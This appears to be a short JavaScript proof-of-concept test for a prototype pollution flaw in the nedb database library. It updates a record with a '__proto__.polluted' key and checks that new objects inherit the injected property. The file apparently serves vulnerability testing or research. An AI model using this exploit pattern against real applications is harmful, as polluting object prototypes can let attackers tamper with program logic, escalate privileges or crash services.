function exploitFunction(payload) {
  const Datastore = require("nedb");
  const db = new Datastore();

  db.insert({ hello: "world" }, (err) => {
    db.update(
      { hello: "world" },
      { $set: { "__proto__.polluted": "yes" } },
      {},
      (err) => {
          // The payload is used here to verify if the prototype pollution worked
          const testObj = Object.create(payload.__proto__);
          expect(testObj.polluted).toBe("yes");
      }
    );
  });
}

module.exports = { exploitFunction };